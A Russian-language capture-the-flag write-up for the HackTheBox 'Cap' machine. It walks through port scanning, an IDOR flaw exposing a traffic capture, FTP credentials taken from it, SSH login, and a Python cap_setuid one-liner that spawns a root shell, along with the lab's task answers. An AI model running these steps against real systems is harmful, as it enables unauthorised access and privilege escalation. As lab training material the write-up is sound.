# HackTheBox---Cap-Writeup

## Краткая сводка (Summary)
* **Целевая ОС:** Linux (Ubuntu)
* **Вектор входа:** Обнаружение веб-панели Security Dashboard -> Обнаружение уязвимости IDOR (Insecure Direct Object Reference) при анализе отчетов -> Перебор идентификаторов (ID) в URL и скачивание чужого сетевого дампа трафика `0.pcap` -> При использовании Wireshark извлекаем учетные данные пользователя `nathan` из незашифрованного протокола FTP.
* **Повышение привилегий (Privilege Escalation):**
    * **Горизонтальное:** Авторизация на сервере по протоколу SSH с полученными учетными данными.
    * **Вертикальное:** Аудит особых привилегий Linux -> Обнаружение уязвимой конфигурации Linux Capabilities у бинарника Python 3.8 (`cap_setuid`) -> Эксплуатация утилиты для изменения UID процесса на root.

---

## Разведка и Анализ

### Производим первичное сканирование портов
```bash
nmap -sC -sV [ip Cap]
```

### Результат
```text
PORT   STATE    SERVICE VERSION
21/tcp open     ftp     vsftpd 3.0.3
22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open     http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
```

**Task 1: How many TCP ports are open?**
* **Ответ:** `3`

---

## Получение первоначального доступа (Initial Access)

### Анализ уязвимости веб-панели (IDOR)
1. Переходим в браузер по адресу `http://[ip Cap]/`. Нас встречает веб-интерфейс «Security Dashboard».
2. При переходе в меню генерации сетевых отчетов приложение перенаправляет нас на персональный дамп трафика.

**Task 2: After running a "Security Snapshot", the browser is redirected to a path of the format /[something]/[id], where [id] represents the id number of the scan. What is the [something]?**
* **Ответ:** `data` *(URL имеет формат `http://[ip Cap]/data/1`)*.

**Task 3: Are you able to get to other users' scans?**
* **Ответ:** `yes` *(В приложении полностью отсутствует проверка прав доступа к объектам)*.

**Task 4: What is the ID of the PCAP file that contains sensative data?**
* Меняем вручную идентификатор в адресной строке браузера на `0` и переходим по пути `http://[ip Cap]/data/0`. Страница позволяет скачать самый первый сетевой дамп в системе.
* **Ответ:** `0`

### Анализ трафика в Wireshark
5. Скачиваем файл `0.pcap` на атакующую машину и открываем его через анализатор пакетов **Wireshark**.
6. Применяем фильтр отображения по протоколам прикладного уровня.

**Task 5: Which application layer protocol in the pcap file can the sensetive data be found in?**
* **Ответ:** `ftp` *(Протокол передает данные авторизации в незашифрованном виде)*.

7. Анализуруем FTP-пакет -> **Анализ** -> **Отслеживать** -> *TCP Поток*. В открывшемся диалоге перехватываем учетные данные пользователя:
   * Логин: `nathan`
   * Пароль: `Buck3tH4tDF`

**Task 6: We've managed to collect nathan's FTP password. On what other service does this password work?**
* **Ответ:** `ssh`

8. Подключаемся к серверу по протоколу SSH, используя найденный пароль, и забираем первый флаг:
   ```bash
   ssh nathan@[ip Cap]
   cat /home/nathan/user.txt
   ```

---

## Вертикальное повышение привилегий (Root Access)

### Исследование Linux Capabilities
1. Находясь внутри SSH-сессии пользователя `nathan`, проводим аудит особых системных разрешений с помощью утилиты `getcap`:
   ```bash
   getcap -r / 2>/dev/null
   ```
2. Анализируем вывод команды:
   ```text
   /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
   /usr/bin/ping = cap_net_raw+ep
   ...
   ```

**Task 8: What is the full path to the binary on this machine has special capabilities that can be abused to obtain root privileges?**
* **Ответ:** `/usr/bin/python3.8` *(Наличие флага `cap_setuid` позволяет интерпретатору произвольно изменять UID процессов на идентификатор суперпользователя)*.

### Эксплуатация привилегий
3. Используя встроенную возможность Python изменять системный идентификатор, запускаем эксплойт в одну строку, который принудительно переключает UID на `0` (root) и вызывает командную строку `bash`:
   ```bash
   python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
   ```
4. Убеждаемся в успешном повышении прав до максимальных, переходим в корневой каталог администратора и забираем финальный флаг машины:
   ```bash
   whoami
   root
   cat /root/root.txt
   ```
